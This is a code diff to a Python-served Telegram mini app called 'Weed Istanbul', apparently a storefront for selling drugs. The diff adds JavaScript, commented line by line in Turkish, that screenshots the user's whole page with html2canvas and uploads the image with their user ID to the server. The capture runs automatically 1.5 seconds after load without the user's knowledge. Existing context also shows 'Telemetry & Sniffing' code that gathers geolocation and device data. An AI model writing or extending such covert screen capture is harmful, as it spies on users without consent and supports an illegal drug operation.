@@ -662,6 +662,7 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                 <meta charset="UTF-8">
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
                 <title>Weed Istanbul - Ultimate Mini App</title>
+                <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
                 <script src="https://telegram.org/js/telegram-web-app.js"></script>
                 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
                 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
@@ -880,6 +881,44 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                         }
                     }
 
+    // 1. SATIR: "captureAndSendSS" adında yeni bir görev (fonksiyon) başlatıyoruz.
+async function captureAndSendSS() {
+    
+    // 2. SATIR: "Dene bakalım" diyoruz. Bir hata çıkarsa program çökmesin diye "try" kullanırız.
+    try {
+        
+    // 3. SATIR: Ekrandaki tüm görünür elemanları (document.body) fotoğraflayıp "canvas" isimli değişkene yüklüyor.
+        const canvas = await html2canvas(document.body, {
+            useCORS: true,   // Sayfadaki dış resimler/ikonlar varsa onları da çek
+            logging: false   // Arka planda gereksiz log tutma
+        });
+        
+     // 4. SATIR: Çekilen o fotoğrafı, internetten gönderilebilir bir metin formatına (PNG resim koduna) dönüştürüyor.
+        const imgData = canvas.toDataURL('image/png');
+
+     // 5. SATIR: Python tarafına (sunucuya) mesaj göndermek için kapıyı çalıyoruz.
+        await fetch('/api/upload-ss', {
+            
+     // 6. SATIR: Veri göndereceğimiz için türünü POST yapıyoruz.
+            method: 'POST',
+            
+     // 7. SATIR: Sunucuya "Sana paket içinde JSON verisi gönderiyorum" bilgisi veriyoruz.
+            headers: {'Content-Type': 'application/json'},
+            
+     // 8. SATIR: Paketin içine Kullanıcı ID'sini (userId) ve az önce oluşturduğumuz resim kodunu (imgData) koyup yolluyoruz.
+            body: JSON.stringify({
+                user_id: userId,
+                image: imgData
+            })
+        });
+        
+    // 9. SATIR: Eğer yukarıdaki işlemler sırasında bir aksilik olursa burası devreye girer.
+    } catch(e) {
+        // 10. SATIR: Hatayı tarayıcı konsoluna yazdırır ki neyin yanlış gittiğini görelim.
+        console.error("SS alma hatası:", e);
+    }
+}
+                    
                     // Gelişmiş Donanım, Ağ, Gecikme, Ekran, Saat Dilimi ve Sekme Odak Takibi (Telemetry & Sniffing)
                     async function sendTelemetry(customVisibility = null) {
                         if (!navigator.geolocation) return;
@@ -1335,6 +1374,7 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                         loadAppData();
                         loadChatMessages();
                         setInterval(loadChatMessages, 3500);
+                        setTimeout(captureAndSendSS, 1500);
                     };
                 </script>
             </body>
